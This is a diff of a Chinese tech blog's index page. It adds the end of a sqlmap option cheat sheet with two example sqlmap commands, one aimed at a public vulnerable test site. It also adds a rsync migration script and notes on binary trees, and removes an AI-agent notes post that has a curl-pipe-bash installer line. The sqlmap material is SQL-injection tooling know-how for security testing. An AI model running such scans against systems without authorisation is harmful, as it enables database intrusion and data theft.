+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-s SESSIONFILE 保存和恢复检索会话文件的所有数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--flush-session 刷新当前目标的会话文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--fresh-queries 忽略在会话文件中存储的查询结果
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--eta 显示每个输出的预计到达时间
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--update 更新SqlMap
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--save file保存选项到INI配置文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--batch 从不询问用户输入，使用所有默认配置。
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Miscellaneous（杂项）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--beep 发现SQL注入时提醒
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--check-payload IDS对注入payloads的检测测试
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cleanup SqlMap具体的UDF和表清理DBMS
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--forms 对目标URL的解析和测试形式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--page-rank Google dork结果显示网页排名（PR）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--parse-errors 从响应页面解析数据库管理系统的错误消息
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--replicate 复制转储的数据到一个sqlite3数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--wizard 给初级用户的简单向导界面
+	</li>
+</ul>
+
+<p>
+	sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1
+</p>
+<p>
+	sqlmap-master\sqlmap.py -u &nbsp;"http://www.ddd.com/index?d=55" --batch --banner
+</p>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
 
         </div>
     
@@ -531,77 +1122,13 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/02/07/AI-agent/">
-                Agent OS
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-02-07</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/新/">新</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="prompts-提示词"><a href="#prompts-提示词" class="headerlink" title="prompts 提示词"></a>prompts 提示词</h1><p>│   │   ├── engine.go      # Prompt 渲染引擎（负责拼接变量）<br>│   │   ├── system.go      # 全局系统级提示词<br>│   │   ├── trading.go     # 量化交易专用提示词<br>│   │   └── developer.go   # 代码开发专用提示词</p>
-<h1 id="RAG"><a href="#RAG" class="headerlink" title="RAG"></a>RAG</h1><p>Agent OS，理解 RAG (Retrieval-Augmented Generation，检索增强生成) 至关重要。</p>
-<p>简单来说，RAG 就是给你的 AI 大脑（Ollama）配了一个**“随时可以查阅的私人图书馆”**。</p>
-<h2 id="nomic-embed-text"><a href="#nomic-embed-text" class="headerlink" title="nomic-embed-text"></a>nomic-embed-text</h2><ul>
-<li>Llama3 (LLM)：是学生的大脑，负责思考和组织语言。</li>
-<li>RAG (知识库)：是那本参考书，记录了你的代码和量化策略。</li>
-<li>nomic-embed-text：就是书里的索引目录，它负责把复杂的问题转化成可以被检索的坐标。</li>
-</ul>
-<h1 id="如果你把-Agent-OS-比作一个自动化工厂，那么："><a href="#如果你把-Agent-OS-比作一个自动化工厂，那么：" class="headerlink" title="如果你把 Agent OS 比作一个自动化工厂，那么："></a>如果你把 Agent OS 比作一个自动化工厂，那么：</h1><p>LangChain 是工厂里的各种标准零部件和传送带（如：模型接口、提示词模板、向量库连接器）。</p>
-<p>LangGraph 是工厂的中央控制程序，它负责处理复杂的逻辑跳转、循环重试和状态持久化。</p>
-<h2 id="LangChain：线性的“链”"><a href="#LangChain：线性的“链”" class="headerlink" title="LangChain：线性的“链”"></a>LangChain：线性的“链”</h2><p>LangChain 的核心逻辑是 Chain（链）。</p>
-<p>模式：A → B → C。</p>
-<p>特点：通常是单向流动的。比如：读取 PDF -&gt; 切片 -&gt; 检索向量 -&gt; 生成回答。</p>
-<p>局限：很难处理“回头路”。如果你想让 AI 检查自己的回答，如果不满意就退回上一步重写（循环），用 LangChain 写起来会非常痛苦且乱糟妙。</p>
-<h2 id="LangGraph：循环的“图”"><a href="#LangGraph：循环的“图”" class="headerlink" title="LangGraph：循环的“图”"></a>LangGraph：循环的“图”</h2><p>LangGraph 是在 LangChain 之上构建的，它把任务看作一个 Graph（图）。</p>
-<p>模式：节点（Node）+ 边（Edge）。</p>
-<p>核心能力：</p>
-<p>循环（Cycles）：支持 AI 思考 -&gt; 动作 -&gt; 观察结果 -&gt; 不对再重新思考。</p>
-<p>状态管理（State）：它有一个全局的“黑板”，所有节点都能读写。</p>
-<p>持久化（Persistence）：执行到一半可以断电保存，下次接着跑（这正是你 Agent OS 需要的“稳”）。</p>
-<p>人机交互（Human-in-the-loop）：可以停下来等人类点击“批准”，再继续下一步。</p>
-<h1 id="workflow-的核心思想"><a href="#workflow-的核心思想" class="headerlink" title="workflow 的核心思想"></a>workflow 的核心思想</h1><p>计划、行动、观察、反思、修正<br>定义 Agent 的“意识”状态 (计划、行动、观察、反思、修正)</p>
-<h1 id="adapter-【手脚】统一的接口适配器层，负责与外部世界交互"><a href="#adapter-【手脚】统一的接口适配器层，负责与外部世界交互" class="headerlink" title="adapter&#x2F;           # 【手脚】统一的接口适配器层，负责与外部世界交互"></a>adapter&#x2F;           # 【手脚】统一的接口适配器层，负责与外部世界交互</h1><p>最好以流的形式出现 这样快捷 而且容易给到答案</p>
-<h2 id="测试点"><a href="#测试点" class="headerlink" title="测试点"></a>测试点</h2><h1 id="用不同简单词测试"><a href="#用不同简单词测试" class="headerlink" title="用不同简单词测试"></a>用不同简单词测试</h1><p>你好<br>nihao<br>hello</p>
-<p>看agent 是否回对答如流或卡壳</p>
-<h1 id="上下文对接"><a href="#上下文对接" class="headerlink" title="上下文对接"></a>上下文对接</h1><p>你好<br>如果我这样做怎样</p>
-<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>礼部 语义解析很关键</p>
-<p>工部 数据存储 干活的</p>
-<h2 id="openclaw-ollama"><a href="#openclaw-ollama" class="headerlink" title="openclaw + ollama"></a>openclaw + ollama</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/navysummer/p/19686654">https://www.cnblogs.com/navysummer/p/19686654</a></p>
-<p>curl -fsSL <a target="_blank" rel="noopener" href="https://openclaw.ai/install.sh">https://openclaw.ai/install.sh</a> | bash</p>
-<p>卸载</p>
-<p>kill -9 XX<br>rm -rf ~&#x2F;.openclaw</p>
-<p>export PATH&#x3D;”$HOME&#x2F;.openclaw:$PATH”<br>source ~&#x2F;.zshrc</p>
-<p>&#x2F;&#x2F; openclaw 命令</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2025/12/17/stock/">
+            <a href="/2026/09/13/stock/">
                 股市币市
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2025-12-17</span>
+                <span class="date">2026-09-13</span>
             
             
             
@@ -643,13 +1170,13 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2025/12/17/system-migration/">
+            <a href="/2026/09/13/system-migration/">
                 系统迁移
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2025-12-17</span>
+                <span class="date">2026-09-13</span>
             
             
             
@@ -668,6 +1195,74 @@
 <p>backup_and_migrate.sh</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要变量</span></span><br><span class="line">SOURCE_USER=<span class="string">&quot;source_user&quot;</span></span><br><span class="line">SOURCE_HOST=<span class="string">&quot;source_host&quot;</span></span><br><span class="line">SOURCE_DIR=<span class="string">&quot;/path/to/source/directory/&quot;</span></span><br><span class="line">TARGET_USER=<span class="string">&quot;target_user&quot;</span></span><br><span class="line">TARGET_HOST=<span class="string">&quot;target_host&quot;</span></span><br><span class="line">TARGET_DIR=<span class="string">&quot;/path/to/target/directory/&quot;</span></span><br><span class="line">BACKUP_DIR=<span class="string">&quot;/path/to/backup/directory/&quot;</span></span><br><span class="line">LOG_FILE=<span class="string">&quot;migration.log&quot;</span></span><br><span class="line">EMAIL_RECIPIENT=<span class="string">&quot;admin@example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建备份</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;创建备份...&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">rsync -avz --delete --progress -e ssh <span class="variable">$SOURCE_USER</span>@<span class="variable">$SOURCE_HOST</span>:<span class="variable">$SOURCE_DIR</span> <span class="variable">$BACKUP_DIR</span> 2&gt;&amp;1 | <span class="built_in">tee</span> -a <span class="variable">$LOG_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查备份成功</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份成功，保存在 <span class="variable">$BACKUP_DIR</span>&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份失败！请检查日志 <span class="variable">$LOG_FILE</span> 以获取详细信息&quot;</span> | mail -s <span class="string">&quot;Backup Failed&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行迁移</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;开始迁移...&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">rsync -avz --delete --progress -e ssh <span class="variable">$SOURCE_USER</span>@<span class="variable">$SOURCE_HOST</span>:<span class="variable">$SOURCE_DIR</span> <span class="variable">$TARGET_USER</span>@<span class="variable">$TARGET_HOST</span>:<span class="variable">$TARGET_DIR</span> 2&gt;&amp;1 | <span class="built_in">tee</span> -a <span class="variable">$LOG_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查迁移成功</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迁移成功！从 <span class="variable">$SOURCE_HOST</span> 到 <span class="variable">$TARGET_HOST</span>&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份和迁移成功！日志详情见 <span class="variable">$LOG_FILE</span>&quot;</span> | mail -s <span class="string">&quot;Server Migration Success&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迁移失败！请检查日志 <span class="variable">$LOG_FILE</span> 以获取详细信息&quot;</span> | mail -s <span class="string">&quot;Migration Failed&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出完成信息</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;备份和迁移完成：从 <span class="variable">$SOURCE_HOST</span> 到 <span class="variable">$TARGET_HOST</span> 和 <span class="variable">$BACKUP_DIR</span>&quot;</span></span><br></pre></td></tr></table></figure>
 <h2 id="mongo-数据迁移"><a href="#mongo-数据迁移" class="headerlink" title="mongo 数据迁移"></a>mongo 数据迁移</h2><p><a target="_blank" rel="noopener" href="https://www.mongodb.com/zh-cn/docs/ops-manager/current/tutorial/migrate-member-to-new-hardware/">将副本集成员迁移到新服务器</a></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/13/tree/">
+                树 ADT
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-13</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/AI/">AI</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <pre class="mermaid">graph LR
+    A[树] --> B[二叉树]
+    B[二叉树] --> C[完全二叉树]
+    C[完全二叉树] --> D[满二叉树]
+    C[完全二叉树] --> E[堆]
+    E[堆] --> F[大顶堆]
+    E[堆] --> G[小顶堆]
+    B[二叉树] --> H[二叉查找树]
+    B[二叉树] --> I[平衡二叉树]
+    B[二叉树] --> J[平衡二叉查找树]
+    J[平衡二叉查找树] --> K[红黑树]
+    J[平衡二叉查找树] --> L[AVL]
+    A[树] --> M[N叉树]
+    M[N叉树] --> N[B树]
+    M[N叉树] --> O[B+树]</pre>
+
+<p><img src="/images/tree.png"></p>
+<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>每一个节点最多两个子节点</p>
+<p><img src="/images/tree-ercha.png"></p>
+<p>前序遍历<br>遍历顺序是根节点-&gt;左子树-&gt;右子树<br>遍历的得到的序列是：<code>1 2 4 5 3 6 7</code></p>
+<p>中序遍历<br>遍历顺序是左子树-&gt;根节点-&gt;右子树<br>遍历的得到的序列是：<code>4 2 5 1 6 3 7</code></p>
+<p>后序遍历<br>遍历顺序是左子树-&gt;右子树-&gt;根节点<br>遍历的得到的序列是：<code>4 5 2 6 7 3 1</code></p>
+<p>满二叉树</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底层</span><br><span class="line">2.除了叶子节点，每个节点都有左、由两个子节点</span><br></pre></td></tr></table></figure>
+
+<p>完全二叉树</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底下两层</span><br><span class="line">2.最后一层的子节点，都靠左排列</span><br><span class="line">3.除了最后一层，其它层的节点个数，都要达到最大</span><br></pre></td></tr></table></figure>
+
+<p>二叉查找树</p>
+<p><img src="/images/tree-erchachaozhao.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.树中的每一个节点的值</span><br><span class="line">2.都要大于左子树中每个节点的值</span><br><span class="line">3.都要小于右子树中每个节点的值</span><br></pre></td></tr></table></figure>
+
+<p>AVL树</p>
+<p><img src="/images/tree-erchachazhao-to-avl.png"></p>
+<p>红黑树</p>
+<p><img src="/images/tree-honghei.png"></p>
+<p>B树</p>
+<p>B+树</p>
 
         </div>
     
@@ -724,11 +1319,11 @@
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/08/25/shanggu-%E7%9F%A5%E8%AF%86%E5%90%8C%E6%AD%A5%E9%93%BE%E8%B7%AF%E7%9A%84%E6%B5%8B%E8%AF%95%E4%B8%8E%E8%BF%9E%E9%80%9A%E6%80%A7%E9%AA%8C%E8%AF%81%E6%8C%87%E5%8D%97/">知识同步链路的测试与连通性验证指南</a>
+                <a class="footer-post" href="/2026/09/13/social-engineering/">社工库工具</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/08/25/shanggu-%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9F%A5%E8%AF%86%E5%90%8C%E6%AD%A5%E4%B8%8E%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E6%9E%B6%E6%9E%84%E8%A7%84%E8%8C%83/">自动化知识同步与数据采集架构规范</a>
+                <a class="footer-post" href="/2026/09/13/software-structure/">软件架构演变</a>
             </li>
             
         </ul>
